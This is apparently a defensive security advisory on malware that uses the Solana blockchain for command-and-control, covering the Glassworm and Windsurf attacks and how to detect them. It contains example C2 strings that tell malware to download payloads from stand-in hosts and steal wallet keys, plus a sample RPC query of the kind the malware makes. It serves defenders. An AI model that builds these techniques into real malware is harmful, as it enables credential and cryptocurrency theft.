# Advisory - Solana Blockchain C2

***

## Summary
A lot of malware includes C2 capabilities that allow an attacker to send commands to the malware implant. We also see a lot of these being able to be taken down as they are hosted on a site with a domain. A new trend has been emerging where they are using cryptocurrency blockchains to send the commands for C2 as it is decentralized and very difficult to take down. Solana seems to be the hacker choice in a couple of more recent attacks and this advisory talks a bit about that as well as a small primer on blockchain.

## What is a blockchain?
A blockchain is the foundational technology behind most cryptocurrencies like Bitcoin or Ethereum, and it serves as a special type of database. A blockchain is essentially a distributed ledger, a record of transactions, that is shared across many computers (nodes) in a network. Instead of one central authority keeping track of transactions, everyone in the network has a copy. 

Some key characteristics are:
1. Decentralized: No single entity controls it.
2. Immutable: Once a transaction is added, it cannot easily be changed.
3. Transparent: Transactions are visible to all participants on the network.

Cryptocurrencies rely on blockchain to track ownership and movement of coins. Without blockchain, digital currencies would face major problems like double-spending (spending the same coin twice). Think of blockchain as a shared notebook where everyone can write entries, but no one can erase previous pages, and each new page is locked to the previous one in a way that everyone can see. Cryptocurrency is what you’re tracking in that notebook. Cryptocurrency is basically digital money. You can send it, receive it, and store it, but it exists only online. No physical coins or bills.

As this advisory is talking about Solana crypto, we will use that as an example. On the Solana blockchain, the cryptocurrency is called SOL. On Solana, this ledger is maintained by thousands of computers called nodes. Every time someone sends SOL to someone else, it gets written in a block, which is then added to the chain. Once it’s added, it’s permanent, you can’t erase or fake it.

A common example whenever someone teaches cryptography is to use Bob and Alice, so let's use them to make this simpler to understand.
1. Alice gets some SOL because she wants to buy digital art online.
2. First, she sets up a Solana wallet (think of it like a digital bank account).
3. She buys 10 SOL from a crypto exchange and it lands in her wallet.
4. Alice wants to send 3 SOL to Bob and Bob also has a Solana wallet.
5. Alice opens her wallet app (Phantom is pretty popular for Solana), types Bob’s public address (like an account number), and enters 3 SOL to send and she clicks Send.
6. Solana checks the transaction. Solana uses its Proof of History system to record the exact order of transactions.
7. The network makes sure Alice really has 3 SOL to send and hasn’t already spent it somewhere else (double-spend).
8. The transaction gets added to the blockchain. Once verified, this transfer is grouped into a "block" and added to the Solana blockchain.
9. This block is linked to all previous blocks, like pages in an unchangeable ledger.
10. Bob receives the SOL. Bob’s wallet instantly shows +3 SOL and Alice’s wallet now shows 7 SOL.
11. Everyone can see it (transparently). The transaction is public on the blockchain. Anyone can see that Alice sent 3 SOL to Bob, but private details like wallet identities remain pseudonymous.

Think of it like Alice dropping digital cash into Bob’s mailbox, but the mailbox is protected by thousands of cameras (nodes) that everyone can check, so nobody can steal or fake the money. When compared to other crypto, Solana is quite fast. Typical blockchain times are as follows:
1. Solana 0.4 seconds
2. Bitcoin 10 minutes
3. Ethereum 12-15 seconds

For something like Bitcoin, it would hold up the transactions until it can validate, which could be around 10 minutes. Your transaction isn’t completely lost, it just takes longer to confirm. 

## What is Solana?
Solana is a high-performance blockchain designed for decentralized applications (dApps) and crypto-currencies. Solana is often described as the "world's fastest stock exchange" because of its incredible speed and low costs. Launched in 2020 by Anatoly Yakovenko, it was built to solve the "Scalability Trilemma", the challenge of balancing security, decentralization, and speed.

Most blockchains require miners or validators to talk back and forth to agree on when a transaction happened. Solana uses a unique set of innovations to skip that chatter.

Key Components include:
1. Proof of History: This is Solana's secret sauce. Instead of waiting for the whole network to agree on the time, PoH creates a historical record that proves an event happened at a specific moment. Think of it like a digital watermark or a clock built into the blockchain. 
2. Tower BFT: This is a custom version of the consensus algorithm (Proof of Stake) that works specifically with the PoH clock. It allows validators to vote on the state of the ledger without massive delays.
3. Sea-level (Parallel Processing): While Ethereum processes transactions one by one (linearly), Solana can process thousands of transactions at the same time. It’s like opening 50 checkout lanes at a grocery store instead of just one

## What is a Smart Contract?
A smart contract is essentially a self-executing program on a blockchain that automatically enforces rules when certain conditions are met. Think of it as a digital "if-then" agreement stored on a blockchain. Once deployed, it runs automatically, no middleman or central authority is needed. It's immutable, once it’s on the blockchain, it cannot be changed, ensuring trust.

How it works:
1. A developer writes a smart contract using a blockchain’s programming language (e.g., Solana uses Rust or C, Ethereum uses Solidity).
2. They deploy it on the blockchain.
3. Users interact with it by sending transactions that trigger the contract.
4. The contract executes predefined actions automatically based on the inputs.

Malware can use it to retrieve instructions or small payloads from the blockchain. In the case of our advisory, if the used smart contracts, it may look like this:
1. Attacker deploys a smart contract on Solana. The contract is programmed to hold encoded instructions for malware.
2. Malware queries the contract. Instead of scanning transactions, it calls the contract's function to get the current instructions. This may be URLs to download executables, encryption keys for exfil, etc. Maybe something like:
```
ACTION=DOWNLOAD;URL=http://malware.example/payload.py;SCAN=SOL_WALLETS
```
3. Malware executes the instructions received from the contract.

## How is it being used maliciously?
Some recent attacks like Glassworm and Windsurf show a trend starting where they use Solana blockchains as a C2 mechanism to send commands to malware. This does not mean Solana blockchain is compromised, it's just being used as a C2. 

### Glassworm
For the Glassworm attack, it played out like:
1. Attackers took over GitHub accounts of developers.
2. They force-pushed malicious code into hundreds of Python repositories.
3. The injected code included malware designed to steal cryptocurrency keys or credentials, sometimes including wallets for Solana or other chains.
4. To communicate with the malware on the victims machine, the attacker sends a small transaction or writes data to the Solana blockchain. Solana transactions can carry arbitrary data in a field called memo (used by the Memo Program) or in smart contract instructions.
5. The attackers wallet address is hardcoded in the malware and the Glassworm malware reads the blockchain periodically, looking for any recent transactions
6. Malware reads the transaction’s data field and decodes it into actionable instructions. Example: a small piece of text in the transaction could say:
```
RUN https://example.com/malware_payload.py
STEAL solana_wallet_keys
```
This is a supply chain attack: the code you download from a library may already be compromised before you run it. Attackers like it because:
1. Hard to take down the C2 because Solana is decentralized.
2. Looks like normal blockchain activity, so network monitoring may miss it.
3. No IP addresses to block, malware just reads the blockchain.
4. The attacker only needs one wallet and one set of instructions to be used by multiple malware all at once. 

### Windsurf
Another attack using Solana blockchain for C2 is Windsurf. This one utilizes a browser extension and the attack flow looks like the following:
1. The attacker created a malicious Windsurf IDE extension disguised as an R language support extension for Visual Studio Code. They did some typosquat techniques naming it reditorsupporter.r-vscode-2.8.8-universal, very similar to the legitimate REditorSupport. Installing this extension triggers the malware without needing a standalone executable.
2. The extension contains a loader script that decrypts a second-stage payload only after installation, avoiding detection. 
3. It performs system profiling: Checks username, locale, timezone, UTC offset. Shuts down if the system appears to be in Russia (likely to avoid domestic legal risk).
4. Instead of traditional servers, the malware queries Solana blockchain transactions for instructions. It uses Solana RPC method getSignaturesForAddress, pulls encoded, AES-encrypted JavaScript payload fragments from transaction metadata and Base64-decoded payloads are dynamically reconstructed and executed in NodeJS.
5. Malware drops native NodeJS .node modules and a DLL. It extracts browser passwords, cookies, session tokens from Chromium-based browsers. 


## Detection
Key things for detection include:
1. Malware has to contain the attacker's wallet or smart contract address in order to know where to look.
2. Once the wallet or contract is known, it can be monitored in real time for suspicious instructions or payload updates.
3. Malware still has to download payloads or send stolen data somewhere, so normal malware detection applies here. 
4. In the context of Solana, an "endpoint" usually refers to an RPC (Remote Procedure Call) node that malware uses to read or interact with the blockchain. Detecting malware using Solana often involves monitoring connections to these endpoints. A Solana RPC endpoint is essentially a web address or IP:port that lets software query the blockchain. An example is https://api.mainnet-beta.solana.com

A malware request that asks the blockchain for the last 10 transactions of the wallet AttackerWalletXYZ may look like:
```
POST / HTTP/1.1
Host: api.mainnet-beta.solana.com
Content-Type: application/json
{
  "jsonrpc":"2.0",
  "id":1,
  "method":"getSignaturesForAddress",
  "params":["AttackerWalletXYZ", {"limit": 10}]
}
```

Blocking a specific Solana wallet in the context of malware C2 isn't the same as blocking a traditional IP or domain, because blockchain wallets are not network addresses, they're just public cryptographic identifiers. You can’t prevent someone from sending transactions to or from that wallet. However, in detection and mitigation, you can prevent malware from reading instructions from that wallet on your endpoints. To do this:
1. Reverse-engineer the malware or analyze network/JSON-RPC logs (like I show above).
2. Extract the public wallet address or smart contract ID that the malware queries. In the example above, its AttackerWalletXYZ.
3. If malware uses a public RPC endpoint (e.g., api.mainnet-beta.solana.com) to read the wallet, Use a web filter, firewall, or network policy to deny requests where the JSON-RPC params field contains that wallet. An example is the Glassworm attack, where the IOC for the Solana wallet was 28PKnu7RzizxBzFPoLp69HLXp9bJL3JFtT2s5QzHsEA2. 


## References
```
https://www.bitdefender.com/en-us/blog/labs/windsurf-extension-malware-solana
https://www.koi.ai/blog/glassworm-first-self-propagating-worm-using-invisible-code-hits-openvsx-marketplace#heading-5
https://secureannex.com/blog/glassworm-continued/
https://www.stepsecurity.io/blog/forcememo-hundreds-of-github-python-repos-compromised-via-account-takeover-and-force-push
```
